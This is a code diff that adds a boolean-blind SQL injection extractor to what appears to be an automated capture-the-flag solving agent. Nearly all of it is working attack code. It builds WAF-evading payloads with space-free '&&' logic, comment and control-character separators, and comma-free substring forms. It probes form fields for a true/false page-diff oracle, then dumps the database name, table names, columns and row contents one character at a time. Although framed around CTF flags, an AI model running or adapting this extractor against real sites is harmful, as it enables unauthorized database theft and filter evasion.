@@ -60,6 +60,87 @@ _SQLI_UNION_MARKER_HEX = "0x3c3c4648553e3e"  # hex("<<FHU>>")
 _SQLI_UNION_MAX_COLUMNS = 8
 _SQLI_UNION_SENTINEL_BASE = 918200  # distinctive ints unlikely to occur naturally
 
+# ---------------------------------------------------------------------------
+# Boolean-blind extraction with WAF-evasion payload synthesis
+# ---------------------------------------------------------------------------
+# sqlmap's payload templates lean on keyword+space structure that a
+# keyword-and-space blacklist (HackWorld-class WAF) rejects, so sqlmap
+# "does not seem to be injectable" even though the parameter is. This native
+# extractor synthesises keyword-lean, space-free boolean oracles — ``&&``/``||``
+# logic instead of ``and``/``or``, parenthesised sub-queries instead of
+# space-separated clauses, ``/**/`` or raw control-char separators, and
+# ``substr``/``mid`` + ``ascii``/``ord`` alternates — then reconstructs data one
+# character at a time via a page-diff oracle. Unlike UNION extraction it needs
+# no reflected column, and unlike the sqlmap path it needs no external binary.
+_BLIND_SEPARATORS = (" ", "/**/", "\n", "\t", "\x0b", "\x0c", "\r")
+_BLIND_CONTEXTS = ("numeric", "string_single", "string_double")
+_BLIND_PRINTABLE_LO = 31   # exclusive lower bound for a binary search over 32..126
+_BLIND_PRINTABLE_HI = 127  # exclusive upper bound
+_BLIND_MAX_ORACLE_PROBES = 48
+_BLIND_MAX_EXTRACT_REQUESTS = 1400
+_BLIND_MAX_STR_LEN = 96
+_BLIND_TABLES_EXPR = (
+    "select(group_concat(table_name))from(information_schema.tables)"
+    "where(table_schema=database())"
+)
+
+
+def _blind_normalize_body(body: str) -> str:
+    """Collapse volatile bits so a TRUE page and a FALSE page compare stably.
+
+    Digit runs are masked (an echoed id must not read as a content difference)
+    and whitespace collapsed. Two responses with the same normalized form are
+    treated as the same boolean outcome.
+    """
+    return " ".join(re.sub(r"\d+", "#", body or "").split())
+
+
+def _blind_wrap_payload(context: str, condition: str, sep: str) -> str:
+    """Wrap a space-free boolean ``condition`` into an injection for ``context``.
+
+    ``numeric`` closes nothing (``1&&(cond)``); the string contexts close a
+    quote and comment out the trailing quote (``1'&&(cond)#``). ``sep`` is the
+    separator flavour (space, ``/**/`` or a raw control char) inserted around the
+    logic operator so a space-blacklist can be side-stepped.
+    """
+    body = f"{sep}&&{sep}({condition}){sep}"
+    if context == "numeric":
+        return f"1{body}"
+    if context == "string_single":
+        return f"1'{body}#"
+    if context == "string_double":
+        return f'1"{body}#'
+    return condition
+
+
+def _blind_substr_expr(expr: str, pos: int, *, substr_fn: str, comma: bool) -> str:
+    """A space-free single-character slice of ``expr`` at 1-indexed ``pos``.
+
+    ``comma=True`` uses ``substr(x,pos,1)``; ``comma=False`` uses the
+    comma-free ANSI form ``substr(x from pos for 1)`` for comma-blacklists.
+    """
+    if comma:
+        return f"{substr_fn}(({expr}),{pos},1)"
+    return f"{substr_fn}(({expr})from({pos})for(1))"
+
+
+def _blind_char_gt(
+    expr: str,
+    pos: int,
+    mid: int,
+    *,
+    substr_fn: str = "substr",
+    ascii_fn: str = "ascii",
+    comma: bool = True,
+) -> str:
+    """Condition ``ascii(substr(expr,pos,1)) > mid`` (space-free)."""
+    return f"{ascii_fn}({_blind_substr_expr(expr, pos, substr_fn=substr_fn, comma=comma)})>{mid}"
+
+
+def _blind_len_gt(expr: str, n: int) -> str:
+    """Condition ``length(expr) > n`` (space-free)."""
+    return f"length(({expr}))>{n}"
+
 
 class SQLiExecutorMixin:
     """Unicode/auth/sqlmap/generic SQLi strategies and the local-challenge log pivot."""
@@ -473,6 +554,353 @@ class SQLiExecutorMixin:
             progress=progress,
             reason="; ".join(reasons + [fallback]) if reasons else fallback,
         )
+
+    # ------------------------------------------------------------------ #
+    # Boolean-blind extraction (WAF-evasion synthesis)                    #
+    # ------------------------------------------------------------------ #
+    def _collect_blind_injection_points(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> list[dict[str, Any]]:
+        """Enumerate submittable form fields to try as blind-injection points.
+
+        Any form (GET or POST) with a named, non-decorative input is a candidate;
+        an auth form's username field is tried first. Each point records the form
+        and field so ``_submit_form_request`` can drive it uniformly.
+        """
+        points: list[dict[str, Any]] = []
+        seen: set[tuple[str, str]] = set()
+        forms = [f for f in (page_features.get("forms") or []) if isinstance(f, dict)]
+
+        def _add(form: dict[str, Any], field: str, base: str) -> None:
+            key = (str(form.get("action") or ""), field)
+            if field and key not in seen:
+                seen.add(key)
+                points.append({"form": form, "field": field, "base": base or "1"})
+
+        auth_form = find_auth_form(forms)
+        if auth_form is not None:
+            username_field = _pick_form_field(auth_form, "username")
+            if username_field:
+                _add(auth_form, username_field, "1")
+
+        for form in forms:
+            for item in form.get("inputs") or []:
+                if not isinstance(item, dict):
+                    continue
+                name = str(item.get("name") or "").strip()
+                field_type = str(item.get("type") or "text").strip().lower()
+                if not name or field_type in {"submit", "button", "image", "reset", "hidden", "file"}:
+                    continue
+                _add(form, name, str(item.get("value") or "").strip() or "1")
+
+        return points[:6]
+
+    async def _blind_raw_submit(
+        self,
+        target: str,
+        point: dict[str, Any],
+        value: str,
+        budget: dict[str, int],
+    ) -> str:
+        """Submit ``value`` into one field and return the response body.
+
+        Increments the shared request budget and opportunistically scans the body
+        so an incidental flag is still captured.
+        """
+        budget["n"] = budget.get("n", 0) + 1
+        response, url = await self._submit_form_request(target, point["form"], {point["field"]: value})
+        body = str((response or {}).get("body") or "")
+        await self._scan_and_store(body, url, evidence_source="http-response")
+        return body
+
+    async def _establish_blind_oracle(
+        self,
+        target: str,
+        points: list[dict[str, Any]],
+        budget: dict[str, int],
+    ) -> dict[str, Any] | None:
+        """Find a ``(point, context, separator)`` whose TRUE/FALSE pages differ.
+
+        A working boolean oracle is one where the space-free ``&&(1=1)`` payload
+        renders like the valid baseline while ``&&(1=2)`` renders differently —
+        the signal that the field is boolean-blind injectable in that context.
+        """
+        for point in points:
+            base_sig = _blind_normalize_body(await self._blind_raw_submit(target, point, str(point["base"]), budget))
+            for context in _BLIND_CONTEXTS:
+                for sep in _BLIND_SEPARATORS:
+                    if budget.get("n", 0) >= _BLIND_MAX_ORACLE_PROBES:
+                        return None
+                    true_body = await self._blind_raw_submit(
+                        target, point, _blind_wrap_payload(context, "1=1", sep), budget
+                    )
+                    false_body = await self._blind_raw_submit(
+                        target, point, _blind_wrap_payload(context, "1=2", sep), budget
+                    )
+                    true_sig = _blind_normalize_body(true_body)
+                    false_sig = _blind_normalize_body(false_body)
+                    if true_sig and true_sig != false_sig and true_sig == base_sig:
+                        return {
+                            "target": target,
+                            "point": point,
+                            "context": context,
+                            "sep": sep,
+                            "true_sig": true_sig,
+                            "substr_fn": "substr",
+                            "ascii_fn": "ascii",
+                            "comma": True,
+                        }
+        return None
+
+    async def _blind_oracle_true(
+        self,
+        oracle: dict[str, Any],
+        condition: str,
+        budget: dict[str, int],
+    ) -> bool:
+        """True iff the boolean ``condition`` holds on the target (page-diff)."""
+        payload = _blind_wrap_payload(oracle["context"], condition, oracle["sep"])
+        body = await self._blind_raw_submit(oracle["target"], oracle["point"], payload, budget)
+        return _blind_normalize_body(body) == oracle["true_sig"]
+
+    async def _blind_probe_length(
+        self,
+        oracle: dict[str, Any],
+        expr: str,
+        budget: dict[str, int],
+        max_len: int,
+    ) -> int:
+        """Binary-search ``length(expr)`` in ``[0, max_len]`` (``-1`` if over budget)."""
+        lo, hi = 0, max_len
+        while lo < hi:
+            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
+                return -1
+            mid = (lo + hi) // 2
+            if await self._blind_oracle_true(oracle, _blind_len_gt(expr, mid), budget):
+                lo = mid + 1
+            else:
+                hi = mid
+        return lo
+
+    async def _blind_probe_char(
+        self,
+        oracle: dict[str, Any],
+        expr: str,
+        pos: int,
+        budget: dict[str, int],
+    ) -> str | None:
+        """Binary-search the printable char of ``expr`` at 1-indexed ``pos``."""
+        lo, hi = _BLIND_PRINTABLE_LO, _BLIND_PRINTABLE_HI  # value ∈ (lo, hi)
+        while hi - lo > 1:
+            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
+                return None
+            mid = (lo + hi) // 2
+            condition = _blind_char_gt(
+                expr,
+                pos,
+                mid,
+                substr_fn=oracle["substr_fn"],
+                ascii_fn=oracle["ascii_fn"],
+                comma=oracle["comma"],
+            )
+            if await self._blind_oracle_true(oracle, condition, budget):
+                lo = mid
+            else:
+                hi = mid
+        return chr(hi)
+
+    async def _blind_extract_string(
+        self,
+        oracle: dict[str, Any],
+        expr: str,
+        budget: dict[str, int],
+        *,
+        max_len: int = _BLIND_MAX_STR_LEN,
+    ) -> str:
+        """Reconstruct ``expr`` one character at a time via the boolean oracle."""
+        length = await self._blind_probe_length(oracle, expr, budget, max_len)
+        if length <= 0:
+            return ""
+        chars: list[str] = []
+        for pos in range(1, length + 1):
+            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
+                break
+            char = await self._blind_probe_char(oracle, expr, pos, budget)
+            if char is None:
+                break
+            chars.append(char)
+        return "".join(chars)
+
+    async def _blind_scan_for_flag(
+        self,
+        target: str,
+        blob: str,
+        note: str,
+    ) -> _ChainOutcome | None:
+        """Flag-scan a reconstructed blob; surface a verified/runtime flag."""
+        extracted = self._extract_flag(blob or "")
+        if not extracted:
+            return None
+        verification = await self._observe_flag(
+            extracted,
+            target,
+            # The flag is recovered from live HTTP-response differences (the
+            # boolean page-diff oracle), so it is a runtime-observed signal —
+            # same evidence class as the UNION/auth SQLi strategies.
+            evidence_source="http-response",
+            rationale=f"blind SQLi: {note}",
+            evidence_url=target,
+            evidence_snippet=(blob or "")[:240],
+            strategy_kind="blind_sqli",
+        )
+        if verification.decision in {"verified", "runtime"}:
+            await self._store_note(
+                key="ctf_blind_sqli_extract",
+                value=f"boolean-blind extraction recovered flag ({note})",
+                category="vulnerability",
+                target=urlparse(target).netloc or target,
+                url=target,
+                weaknesses=[
+                    {
+                        "id": "sqli-boolean-blind",
+                        "description": "Boolean-blind SQL injection reconstructed database contents.",
+                    }
+                ],
+            )
+            return _ChainOutcome(
+                progress=True,
+                flag=verification.flag,
+                reason=f"blind SQLi {note}",
+                verified=verification.decision == "verified",
+            )
+        return None
+
+    async def _attempt_blind_sqli(
+        self,
+        target: str,
+        page_features: dict[str, Any],
+    ) -> _ChainOutcome:
+        """Native boolean-blind SQLi extractor with WAF-evasion synthesis.
+
+        The sqlmap path fails on keyword+space blacklists (HackWorld-class) whose
+        WAF rejects sqlmap's payload templates outright, so the parameter reads as
+        "not injectable" even though it is. This extractor synthesises keyword-lean,
+        space-free boolean oracles (``&&``/``||`` logic, parenthesised sub-queries,
+        ``/**/``/control-char separators, ``substr``/``mid`` + ``ascii``/``ord``
+        alternates), establishes a page-diff oracle, then reconstructs data one
+        character at a time — needing neither a reflected UNION column nor an
+        external binary. Bounded schema walk: ``database()`` (also calibrating the
+        function flavour) -> ``information_schema`` tables -> columns -> row blob,
+        flag-scanning every reconstructed string. A hard request budget caps cost;
+        the cheap oracle phase bails fast on non-blind targets.
+        """
+        self.tool_guard.require(["http_request"])
+        points = self._collect_blind_injection_points(target, page_features)
+        if not points:
+            return _ChainOutcome(progress=False, reason="blind sqli: no injectable submission surface")
+
+        budget: dict[str, int] = {"n": 0}
+        oracle = await self._establish_blind_oracle(target, points, budget)
+        if oracle is None:
+            return _ChainOutcome(
+                progress=False,
+                reason="blind sqli: no boolean oracle (not blind-injectable or filtered)",
+            )
+
+        host = urlparse(target).netloc or target
+        reasons = [
+            f"boolean-blind oracle on field '{oracle['point']['field']}' "
+            f"(context={oracle['context']}, sep={oracle['sep']!r})"
+        ]
+        await self._store_note(
+            key="ctf_blind_sqli_confirmed",
+            value=(
+                f"field={oracle['point']['field']} context={oracle['context']} "
+                f"separator={oracle['sep']!r} — WAF-evasion boolean-blind injection"
+            ),
+            category="vulnerability",
+            target=host,
+            url=target,
+        )
+
+        # Calibrate the substr/ascii/comma flavour on database() (short), then
+        # reuse the winning combo for the rest of the walk.
+        db = ""
+        for substr_fn, ascii_fn, comma in (
+            ("substr", "ascii", True),
+            ("mid", "ascii", True),
+            ("substr", "ord", True),
+            ("substr", "ascii", False),
+            ("mid", "ord", False),
+        ):
+            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
+                break
+            oracle["substr_fn"], oracle["ascii_fn"], oracle["comma"] = substr_fn, ascii_fn, comma
+            candidate = await self._blind_extract_string(oracle, "database()", budget, max_len=48)
+            if candidate and candidate.isprintable():
+                db = candidate
+                break
+        else:
+            oracle["substr_fn"], oracle["ascii_fn"], oracle["comma"] = "substr", "ascii", True
+
+        if db:
+            reasons.append(f"current database='{db}'")
+            if hit := await self._blind_scan_for_flag(target, db, "database()"):
+                return hit
+
+        # Bounded schema walk: tables -> per-table columns -> row blob.
+        tables_blob = await self._blind_extract_string(oracle, _BLIND_TABLES_EXPR, budget)
+        if hit := await self._blind_scan_for_flag(target, tables_blob, "table dump"):
+            return hit
+        tables = [
+            t for t in tables_blob.split(",") if re.fullmatch(r"[A-Za-z0-9_]+", t or "")
+        ]
+        if tables:
+            reasons.append(f"blind dumped tables: {', '.join(tables[:4])}")
+            await self._store_note(
+                key="ctf_blind_sqli_tables",
+                value=json.dumps({"tables": tables[:10]}, ensure_ascii=False),
+                category="finding",
+                target=host,
+                url=target,
+            )
+
+        def _table_rank(name: str) -> tuple[bool, str]:
+            low = name.lower()
+            interesting = any(
+                tok in low for tok in ("flag", "key", "secret", "ctf", "user", "geek", "world")
+            )
+            return (not interesting, name)
+
+        for table in sorted(tables, key=_table_rank)[:4]:
+            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
+                break
+            table_hex = "0x" + table.encode().hex()
+            cols_expr = (
+                "select(group_concat(column_name))from(information_schema.columns)"
+                f"where(table_name={table_hex})"
+            )
+            cols_blob = await self._blind_extract_string(oracle, cols_expr, budget)
+            if hit := await self._blind_scan_for_flag(target, cols_blob, f"column dump {table}"):
+                return hit
+            cols = [c for c in cols_blob.split(",") if re.fullmatch(r"[A-Za-z0-9_]+", c or "")]
+            if not cols:
+                continue
+            reasons.append(f"blind dumped columns of {table}: {', '.join(cols[:4])}")
+            concat_cols = ",".join(f"ifnull({_quote_sql_identifier(c)},0x20)" for c in cols)
+            rows_expr = (
+                f"select(group_concat(concat_ws(0x7e,{concat_cols})))"
+                f"from({_quote_sql_identifier(table)})"
+            )
+            rows_blob = await self._blind_extract_string(oracle, rows_expr, budget)
+            if hit := await self._blind_scan_for_flag(target, rows_blob, f"row dump {table}"):
+                return hit
+            reasons.append(f"blind dumped rows from {table}")
+
+        # Oracle confirmed injection even if no flag surfaced — that is progress.
+        return _ChainOutcome(progress=True, reason="; ".join(reasons))
 
     async def _attempt_sqlmap_sqli(
         self,
